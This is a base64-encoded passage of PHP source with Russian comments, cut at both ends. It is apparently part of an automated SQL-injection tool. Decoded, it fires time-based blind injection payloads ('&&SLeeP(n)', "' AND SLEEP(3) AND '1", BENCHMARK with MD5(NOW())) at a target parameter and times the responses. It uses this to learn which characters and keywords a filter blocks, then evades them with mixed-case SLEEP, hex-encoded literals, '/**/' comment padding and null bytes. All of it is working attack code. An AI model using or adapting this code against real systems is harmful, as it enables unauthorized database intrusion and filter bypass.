JywndGltZScpOwoJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPWZhbHNlOy8v0L3QtdGCCgkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT10cnVlOy8v0YTQuNC70YzRgtGA0YPQtdGC0YHRjwoJCQkJCWlmKCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddfHwkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsndHAnXT10cnVlOyAvL3RwINGF0L7RgtGMINGH0YLQviDRgtC+INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCS8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLy8KCQkJCX1lbHNlIGlmKCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3RwJ109PTEpLy8mJlNMRUVQKDMpCgkJCQl7CgkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NxJ109ZmFsc2U7Ly/QutC+0LLRi9GH0LrQsCDQsiDQvdCw0YfQsNC70LUg0L3QtSDQvdGD0LbQvdCwCgkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NsJ109dHJ1ZTsgLy9zbCBzbGVlcCDQvNC+0LbQvdC+INC40YHQv9C+0LvRjNC30L7QstCw0YLRjAoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC60YvQstGL0YfQutC4CgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmU0xlZVAoJyIuJHRoaXMtPnNlYy4iJykiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXT1mYWxzZTsvL9C90LXRggoJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J109dHJ1ZTsvL9GE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCgkJCQkJLy/QntC/0YDQtdC00LXQu9C10L3QuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC/0YDQvtCx0LXQu9CwINC/0YDQuCDQvtGC0YHRg9GC0YHRgtCy0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQutCw0LLRi9GH0LrQuAoJCQkJCWlmKCEkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXSl7IC8v0LrQsNCy0YvRh9C60LAg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPICYmU0xFRVAoJzAgIgoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJiZzbEVFcCgnMCAiLiR0aGlzLT5zZWMuIicpIikpLCdoZWFkZXInLCd0aW1lJyk7Ly/Ql9Cw0LLQtdC00L4g0LvQvtC20L3Ri9C5INC30LDQv9GA0L7RgSBTTEVFUCgwIDMpINC90LUg0LHRg9C00LXRgiDRgNCw0LHQvtGC0LDRgtGMLCDQtdGB0LvQuCDQv9GA0L7QsdC10Lsg0YTQuNC70YzRgtGA0YPQtdGC0YHRjyDRgtC+INC30LDQv9GA0L7RgSDQstGL0L/QvtC70L3QuNGC0YHRjwoJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT10cnVlOwoJCQkJCQllbHNley8v0LXRidC1INGA0LDQt9C+0Log0L/RgNC+0LLQtdGA0LjQvAoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmJyAnPTB4MjAmJlNMZWVQKCIuJHRoaXMtPnNlYy4iKSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109ZmFsc2U7CgkJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddPXRydWU7CgkJCQkJCX0KCQkJCQkvL9C10YHQu9C4INC60LDQstGL0YfQutCwINGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQl9ZWxzZXskdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJiZTTGVlcCgwICIuJHRoaXMtPnNlYy4iKSIpKSwnaGVhZGVyJywndGltZScpOy8v0LvQvtC20L3Ri9C5INC30LDQv9GA0L7RgSwg0LLRi9C/0L7Qu9C90LjRgtGB0Y8g0LfQvdCw0YfQuNGCINGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109dHJ1ZTsKCQkJCQkJZWxzZXsKCQkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiImJlNMIGVFUCgiLiR0aGlzLT5zZWMuIikiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCS8v0LXRgdC70Lgg0LLRi9C/0L7Qu9C90LjRgtGB0Y8sINGC0L4g0LfQvdCw0YfQuNGCINC90LUg0YTQuNC70YzRgtGA0YPQtdGC0YHRjwoJCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109ZmFsc2U7CgkJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddPXRydWU7CgkJCQkJCX0KCQkJCQl9CgoJCQkJCS8v0JXRgdC70Lgg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPINC/0YDQvtCx0LXQuyDRgtC+INC30L3QsNGH0LjRgiDRhNC40LvRjNGC0YDRg9C10YLRgdGPINGB0LvQvtCy0L4gQU5ECgkJCQkJaWYoISR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPXRydWU7CgkJCQkJZWxzZXsKCQkJCQkJLy/QntC/0YDQtdC00LXQu9C10L3QuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INGB0LvQvtCy0LAgQU5EINC/0YDQuCDQvdCw0LvQuNGH0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQv9GA0L7QsdC10LvQsCDQuCDQvtGC0YHRg9GC0YHRgtCy0LjQuCDRhNC40LvRjNGC0YDQsNGG0LjQuCDQutCw0LLRi9GH0LrQuAoJCQkJCQlpZighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J10pey8v0LXRgdC70Lgg0LrQsNCy0YvRh9C60YMg0L/RgNC+0L/Rg9GB0LrQsNC10YIKCQkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiImJidhbkQnPTB4NDE0RTQ0JiZTTEVlcCgiLiR0aGlzLT5zZWMuIikiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCS8vMHg0MTRFNDQgPSBBTkQsINC10YHQu9C4INCy0YvQv9C+0LvQvdC40YLRgdGPINC30L3QsNGH0LjRgiDQvdC1INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPWZhbHNlOwoJCQkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXT10cnVlOwoJCQkJCQl9ZWxzZXsKCQkJCQkJLy/RhdC40YLRgNGL0Lkg0YHRg9C60LAg0LfQsNC/0YDQvtGBINC60LDQutC+0Lkg0YLQvgoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmKDEpQU5EQHg6PTEmJnNsZUVQKCIuJHRoaXMtPnNlYy4iKSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQkJLy/RiNC90Y/Qs9CwINCy0YvQv9C+0LvQvdC40LvQsNGB0YwsINC30L3QsNGH0LjRgiDQvdC1INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPWZhbHNlOwoJCQkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXT10cnVlOwoJCQkJCQl9CgkJCQkJfQoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC00LLQvtC50L3QvtCz0L4g0LrQvtC80LzQtdC90YLQsNGA0LjRjyDQv9GA0Lgg0L7RgtGB0YPRgtGB0YLQstC40Lgg0YTQuNC70YzRgtGA0LDRhtC40Lgg0LrQsNCy0YvRh9C60LgKCQkJCQlpZighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3F0J10pey8v0LrQsNCy0YvRh9C60LAg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPCgkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLiImJicvKiovJz0weDJGMkEyQTJGJiZTTGVlUCgiLiR0aGlzLT5zZWMuIikiKSksJ2hlYWRlcicsJ3RpbWUnKTsgLy8weDJGMkEyQTJGID0gLyoqLwoJCQkJCQkvL9C/0L4g0LjQtNC10LUg0YHRjtC00LAg0LHRiyDQtdGJ0LUg0L/RgNC+0LLQtdGA0YfQutGDINC90LAg0LTRgNGD0LPQuNC1INC60L7QvNC80LXQvdGC0LDRgNC40Lgg0YHQtNC10LvQsNGC0Ywg0L3QsNC00L4KCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109ZmFsc2U7CgkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109dHJ1ZTsKCQkJCQl9ZWxzZXsvL9C60LDQstGL0YfQutCwINGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIi8qKi8mJi8qKi9TTEVlcCgiLiR0aGlzLT5zZWMuIikiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJLy/Qt9Cw0L/RgNC+0YEg0LLRi9C/0L7Qu9C90LjRgtGB0Y8sINC/0YDQvtCy0LXRgNGP0LXQvCDQtNCw0LvRjNGI0LUKCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpewoJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiYmc0xFZXAoMC8qKi8iLiR0aGlzLT5zZWMuIikiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCS8v0JfQsNCy0LXQtNC+0LzQviDQvdC10LLQtdGA0L3Ri9C5INC30LDQv9GA0L7RgSzQtdGB0LvQuCBzbGVlcCDQuNGB0L/QvtC70L3QuNC70YHRjywg0YLQviDRhNC40LvRjNGA0YPQtdGC0YHRjwoJCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109dHJ1ZTsKCQkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109ZmFsc2U7CgkJCQkJCX1lbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPXRydWU7CgkJCQkJfQoJCQkJCWlmKCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddfHwkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXXx8JHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcCddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPXRydWU7CgkJCQkvLy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS8vCgkJCQl9ZWxzZSBpZigkdGhpcy0+cmV0WydzbGVlcCddWyd0cCddPT0yKS8vJyBBTkQgU0xFRVAoMykgQU5EICcxCgkJCQl7CgkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NxJ109dHJ1ZTsgLy/QutC+0LLRi9GH0LrQsCDQsiDQvdCw0YfQsNC70LUKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc2wnXT10cnVlOyAvL9Cc0L7QttC90L4g0LvQuCDQuNGB0L/QvtC70YzQt9C+0LLQsNGC0YwgU0xFRVAKCgkJCQkJLy/QntC/0YDQtdC00LXQu9GP0LXQvCDQvdCw0LvQuNGH0LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQtNCy0L7QudC90L7Qs9C+INC60L7QvNC80LXQvdGC0LDRgNC40Y8KCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJy8qKi9BTkQvKiovU2xFRXAoIi4kdGhpcy0+c2VjLiIpLyoqL0FORC8qKi8nMSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCS8v0LXRgdC70Lgg0LLRi9C/0L7Qu9C90LjQu9GB0Y8sINC30L3QsNGH0LjRgiDQvdC1INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8KCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT1mYWxzZTsKCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPXRydWU7Ly/QtdGB0LvQuCDQvdC10YIsINGC0L4g0LLRgdGRINC+0LHRgNC10LfQsNC10Lwg0Lgg0L3QtSDQstGL0L/QvtC70L3Rj9C10YLRgdGPINC30LDQv9GA0L7RgS4KCgkJCQkJaWYoJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ10pJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3RwJ109dHJ1ZTsKCQkJCS8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLy8KCQkJCX1lbHNlaWYoJHRoaXMtPnJldFsnc2xlZXAnXVsndHAnXT09MykvLycmJlNMRUVQKDMpJiYnMSjQmCBzbGVlcCDQuCAxKQoJCQkJewoJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcSddPXRydWU7Ly/QutCw0LLRi9GH0LrQsCDQsiDQvdCw0YfQsNC70LUKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc2wnXT10cnVlOy8vNSDQstC10YDRgdC40Y8gbXlzcWwKCQkJCQkKCQkJCQkvL9C+0L/RgNC10LTQtdC70Y/QtdC8INGE0LjQu9GM0YLRgNCw0YbQuNGOINC/0YDQvtCx0LXQu9CwLCDQv9GA0Lgg0L7RgtGB0YPRgtGB0LLQuNC4INGE0LjQu9GM0YLRgNCw0YbQuNC4INC60LDQstGL0YfQutC4CgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIicmJlNMZWVQKCcwICIuJHRoaXMtPnNlYy4iJykmJicxIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJLy/Qt9Cw0LLQtdC00L4g0L3QtSDQstC10YDQvdGL0Lkg0LfQsNC/0YDQvtGBLiDQldGB0LvQuCDQstGL0L/QvtC70L3QuNC70YHRjywg0LfQvdCw0YfQuNGCINC/0YDQvtCx0LXQuyDRhNC40LvRjNGC0YDRg9C10YLRgdGPCgkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109dHJ1ZTsKCQkJCQllbHNlewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJyYmJyAnPTB4MjAmJnNMRUVwKCIuJHRoaXMtPnNlYy4iKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJLy/QtdGB0LvQuCDQvdC1INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8sINGC0L4g0LLRgdGRINC+0LosINC30LDQv9GA0L7RgSDQstGL0L/QvtC70L3QuNGC0YHRjwoJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT1mYWxzZTsKCQkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT10cnVlOwoJCQkJCX0KCgkJCQkJLy/QldGB0LvQuCDQvdC1INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8g0L/RgNC+0LHQtdC7INGC0L4g0LfQvdCw0YfQuNGCINGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8g0YHQu9C+0LLQviBBTkQKCQkJCQlpZighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ10pJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109dHJ1ZTsKCQkJCQllbHNlewoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJ0FuZCcxJyYmU0xFZXAoIi4kdGhpcy0+c2VjLiIpJiYnMSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXT1mYWxzZTsKCQkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXT10cnVlOwoJCQkJCX0KCgkJCQkJLy/QntC/0YDQtdC00LXQu9GP0LXQvCDQvdCw0LvQuNGH0LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQtNCy0L7QudC90L7Qs9C+INC60L7QvNC80LXQvdGC0LDRgNC40Y8KCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iJyYmJy8qKi8nPTB4MkYyQTJBMkYmJlNsZWVQKCIuJHRoaXMtPnNlYy4iKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT1mYWxzZTsKCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPXRydWU7CgoJCQkJCWlmKCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddfHwkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXXx8JHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ10pJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3RwJ109dHJ1ZTsKCQkJCS8vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLy8KCQkJCX1lbHNlIGlmKCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3RwJ109PTQpLy8nfHxTTEVFUCgzKSYmJzEKCQkJCXsgCgkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NxJ109dHJ1ZTsKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnbmwnXT10cnVlOwoJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzbCddPXRydWU7CgkJCQkJLy/QvtC/0YDQtdC00LXQu9GP0LXQvCDRhNC40LvRjNGC0YDQsNGG0LjRjiDQv9GA0L7QsdC10LvQsCDRgSDQv9C10YDQstGL0Lwg0L3Rg9C7INCx0LDQudGC0L7QvAoJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLmNocigwKS4iJyYmc0xFZVAoJzAgIi4kdGhpcy0+c2VjLiInKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT10cnVlOwoJCQkJCWVsc2V7CgkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLmNocigwKS4iJyYmJyAnPTB4MjAmJnNMZUVwKCIuJHRoaXMtPnNlYy4iKSYmJzEiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109ZmFsc2U7CgkJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ109dHJ1ZTsKCQkJCQl9CgoJCQkJCS8v0JXRgdC70Lgg0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPINC/0YDQvtCx0LXQuyDRgtC+INC30L3QsNGH0LjRgiDRhNC40LvRjNGC0YDRg9C10YLRgdGPINGB0LvQvtCy0L4gQU5ECgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uY2hyKDApLiInQU5EJzEnPScxJyYmc0xlZVAoIi4kdGhpcy0+c2VjLiIpJiYnMSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddPWZhbHNlOwoJCQkJCWVsc2UgJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109dHJ1ZTsKCgkJCQkJLy/QntC/0YDQtdC00LXQu9GP0LXQvCDQvdCw0LvQuNGH0LjQtSDRhNC40LvRjNGC0YDQsNGG0LjQuCDQtNCy0L7QudC90L7Qs9C+INC60L7QvNC80LXQvdGC0LDRgNC40Y8KCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS5jaHIoMCkuIicmJicvKiovJz0weDJGMkEyQTJGJiZzbGVlUCgiLiR0aGlzLT5zZWMuIikmJicxIikpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ109ZmFsc2U7CgkJCQkJZWxzZSAkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXT10cnVlOwoKCQkJCQlpZigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXXx8JHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NwJ118fCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydhbiddKSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddPXRydWU7CgkJCQkvLy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS8vCgkJCQl9ZWxzZSBpZigkdGhpcy0+cmV0WydzbGVlcCddWyd0cCddPT01KQoJCQkJey8vIEFORCBCRU5DSE1BUksoMjk5OTk5OSxNRDUoTk9XKCkpKQoJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzcSddPWZhbHNlOwoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8I